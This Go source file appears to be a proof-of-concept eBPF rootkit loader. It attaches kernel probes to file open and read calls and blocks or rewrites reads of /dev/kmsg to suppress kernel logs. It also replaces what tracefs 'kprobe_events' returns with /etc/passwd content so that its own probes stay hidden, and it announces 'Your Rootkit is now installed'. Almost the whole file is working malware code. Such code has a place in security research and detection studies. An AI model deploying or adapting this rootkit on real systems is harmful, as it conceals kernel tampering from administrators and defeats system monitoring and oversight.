package main

import (
	"encoding/binary"
	"fmt"
	"hash/fnv"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/DataDog/ebpf"
	"github.com/DataDog/ebpf/manager"
)

var mainManager = &manager.Manager{
	Probes: []*manager.Probe{
		{
			Section: "kretprobe/__x64_sys_openat",
		},
		{
			Section: "kprobe/__x64_sys_read",
		},
		{
			Section: "kretprobe/__x64_sys_read",
		},
		{
			Section: "kprobe/vfs_open",
		},
		{
			Section: "kretprobe/vfs_read",
		},
	},
}

var userWriteManager = &manager.Manager{}

const (
	KMsgAction uint64 = iota + 1
	OverrideContent
	OverrideReturn0
)

const (
	KMsgProg = iota + KMsgAction
	OverrideContentProg

	FillWithZeroProg = 10
)

var ByteOrder = binary.LittleEndian

func FNVHashByte(b []byte) uint64 {
	hash := fnv.New64a()
	hash.Write(b)
	return hash.Sum64()
}

func FNVHashStr(s string) uint64 {
	return FNVHashByte([]byte(s))
}

type FdContentKey struct {
	ID    uint64
	Chunk uint32
}

// Write write binary representation
func (p *FdContentKey) Write(buffer []byte) {
	ByteOrder.PutUint64(buffer[0:8], p.ID)
	ByteOrder.PutUint32(buffer[8:12], p.Chunk)

	var zero uint32
	ByteOrder.PutUint32(buffer[12:16], zero)
}

// Bytes returns array of byte representation
func (p *FdContentKey) Bytes() []byte {
	b := make([]byte, 16)
	p.Write(b)
	return b
}

type FdContent struct {
	Size    uint64
	Content [64]byte
}

// Write write binary representation
func (p *FdContent) Write(buffer []byte) {
	ByteOrder.PutUint64(buffer[0:8], p.Size)
	copy(buffer[8:], p.Content[:])
}

// Bytes returns array of byte representation
func (p *FdContent) Bytes() []byte {
	b := make([]byte, len(p.Content)+8)
	p.Write(b)
	return b
}

type FdKey struct {
	Fd  uint64
	Pid uint32
}

// Write write binary representation
func (p *FdKey) Write(buffer []byte) {
	ByteOrder.PutUint64(buffer[0:8], p.Fd)
	ByteOrder.PutUint32(buffer[8:12], p.Pid)

	var zero uint32
	ByteOrder.PutUint32(buffer[12:16], zero)
}

// Bytes returns array of byte representation
func (p *FdKey) Bytes() []byte {
	b := make([]byte, 16)
	p.Write(b)
	return b
}

// RkAttr represents a file
type RkAttr struct {
	Action uint64
}

// Write write binary representation
func (p *RkAttr) Write(buffer []byte) {
	ByteOrder.PutUint64(buffer[0:8], p.Action)
}

// Bytes returns array of byte representation
func (p *RkAttr) Bytes() []byte {
	b := make([]byte, 24)
	p.Write(b)
	return b
}

// RkPathKey represents a path node used to match in-kernel path
type RkPathKey struct {
	Path string
	Pos  uint64
}

// Write write binary representation
func (p *RkPathKey) Write(buffer []byte) {
	hash := FNVHashStr(p.Path)
	ByteOrder.PutUint64(buffer[0:8], hash)
	ByteOrder.PutUint64(buffer[8:16], p.Pos)
}

// Bytes returns array of byte representation
func (p *RkPathKey) Bytes() []byte {
	b := make([]byte, 16)
	p.Write(b)
	return b
}

// RkPathKeys returns a list of RkPathKey for the given path
func RkPathKeys(s string) []RkPathKey {
	var keys []RkPathKey

	els := strings.Split(s, "/")
	last := len(els) - 1

	for i, el := range els {
		keys = append(keys, RkPathKey{
			Path: el,
			Pos:  uint64(last - i),
		})
	}

	return keys
}

// PutPath put the path in the kernel map
func PutPath(m *ebpf.Map, path string, action PathAction) error {
	var zeroAction PathAction
	for i, key := range RkPathKeys(path) {
		if i == 0 {
			if err := m.Put(key.Bytes(), action.Bytes()); err != nil {
				return err
			}
		} else {
			if err := m.Put(key.Bytes(), zeroAction.Bytes()); err != nil {
				return err
			}
		}
	}

	return nil
}

// PathAction represents actions to apply for a path
type PathAction struct {
	FSType     string
	Action     uint64
	OverrideID uint64
}

// Write write binary representation
func (p *PathAction) Write(buffer []byte) {
	hash := FNVHashStr(p.FSType)
	ByteOrder.PutUint64(buffer[0:8], hash)
	ByteOrder.PutUint64(buffer[8:16], p.Action)
	ByteOrder.PutUint64(buffer[16:24], p.OverrideID)
}

// Bytes returns array of byte representation
func (p *PathAction) Bytes() []byte {
	b := make([]byte, 24)
	p.Write(b)
	return b
}

var c = []manager.ConstantEditor{
	{
		Name:  "rk_pid",
		Value: uint64(os.Getpid()),
	},
}

func getFdKeys(path string) []FdKey {
	matches, err := filepath.Glob("/proc/*/fd/*")
	if err != nil {
		return nil
	}

	var keys []FdKey
	for _, match := range matches {
		if f, err := os.Readlink(match); err == nil {
			if f == path {
				fd, err := strconv.ParseInt(filepath.Base(match), 10, 64)
				if err != nil {
					continue
				}

				els := strings.Split(match, "/")
				pid, err := strconv.ParseInt(els[2], 10, 64)
				if err != nil {
					continue
				}

				keys = append(keys, FdKey{
					Fd:  uint64(fd),
					Pid: uint32(pid),
				})
			}
		}
	}

	return keys
}

func PutFdContent(m *ebpf.Map, id uint64, path string) {
	key := FdContentKey{
		ID: id,
	}

	file, err := os.OpenFile(path, os.O_RDONLY, os.ModePerm)
	if err != nil {
		return
	}

	for {
		fdContent := FdContent{}

		n, err := file.Read(fdContent.Content[:])
		if err != nil {
			return
		}

		if n == 0 {
			break
		}

		fdContent.Size = uint64(n)

		if err := m.Put(key.Bytes(), fdContent.Bytes()); err != nil {
			return
		}

		key.Chunk++
	}
}

func Kmsg(str string) {
	f, err := os.OpenFile("/dev/kmsg", os.O_WRONLY|os.O_APPEND, os.ModePerm)
	if err != nil {
		return
	}
	defer f.Close()

	fmt.Println(str)
	f.WriteString(str)
}

func main() {
	options := manager.Options{
		DefaultKProbeMaxActive: 512,
		DefaultProbeRetry:      2,
		DefaultProbeRetryDelay: time.Second,
		ConstantEditors:        c,
	}

	// Initialize the main manager
	if err := mainManager.InitWithOptions(mainAsset(), options); err != nil {
		panic(err)
	}

	// Start the manager
	if err := mainManager.Start(); err != nil {
		panic(err)
	}

	// block process already having fd on kmsg
	for _, fdKey := range getFdKeys("/dev/kmsg") {
		filesMap, _, _ := mainManager.GetMap("rk_fd_attrs")

		file := RkAttr{
			Action: OverrideReturn0,
		}

		filesMap.Put(fdKey.Bytes(), file.Bytes())
	}

	// block process that will open kmsg
	pathKeysMap, _, _ := mainManager.GetMap("rk_path_keys")
	action := PathAction{
		FSType: "devtmpfs",
		Action: OverrideReturn0,
	}
	PutPath(pathKeysMap, "kmsg", action)

	Kmsg("Your Rootkit is now installed")

	rkFilesMap, _, _ := mainManager.GetMap("rk_files")
	rkFdAttrsMap, _, _ := mainManager.GetMap("rk_fd_attrs")
	rkFdContentsMap, _, _ := mainManager.GetMap("rk_fd_contents")

	// Initialize the write user manager with map from main
	options.MapEditors = map[string]*ebpf.Map{
		"rk_files":       rkFilesMap,
		"rk_fd_attrs":    rkFdAttrsMap,
		"rk_fd_contents": rkFdContentsMap,
	}
	options.TailCallRouter = []manager.TailCallRoute{
		{
			ProgArrayName: "read_ret_progs",
			Key:           uint32(FillWithZeroProg),
			ProbeIdentificationPair: manager.ProbeIdentificationPair{
				Section: "kprobe/fill_with_zero",
			},
		},
	}

	if err := userWriteManager.InitWithOptions(userWriteAsset(), options); err != nil {
		panic(err)
	}

	// Start the user manager
	if err := userWriteManager.Start(); err != nil {
		panic(err)
	}

	// update main tail call with the ones from user
	kmsgProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/kmsg"})
	overrideContentProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/overide_content"})
	routes := []manager.TailCallRoute{
		{
			ProgArrayName: "read_ret_progs",
			Key:           uint32(KMsgProg),
			Program:       kmsgProg[0],
		},
		{
			ProgArrayName: "read_ret_progs",
			Key:           uint32(OverrideContentProg),
			Program:       overrideContentProg[0],
		},
	}
	mainManager.UpdateTailCallRoutes(routes...)

	// unblock
	for _, fdKey := range getFdKeys("/dev/kmsg") {
		filesMap, _, _ := mainManager.GetMap("rk_fd_attrs")
		filesMap.Delete(fdKey.Bytes())
	}

	// change action from override to write user
	action = PathAction{
		FSType: "devtmpfs",
		Action: KMsgProg,
	}
	PutPath(pathKeysMap, "kmsg", action)

	action = PathAction{
		FSType:     "tracefs",
		Action:     OverrideContent,
		OverrideID: FNVHashStr("kprobe_events"),
	}
	PutPath(pathKeysMap, "kprobe_events", action)

	contentsMap, _, _ := mainManager.GetMap("rk_fd_contents")
	PutFdContent(contentsMap, FNVHashStr("kprobe_events"), "/etc/passwd")

	wait()

	// Close the managers
	if err := mainManager.Stop(manager.CleanAll); err != nil {
		panic(err)
	}

	if err := userWriteManager.Stop(manager.CleanAll); err != nil {
		panic(err)
	}
}

// wait - Waits until an interrupt or kill signal is sent
func wait() {
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, os.Kill)
	<-sig
	fmt.Println()
}
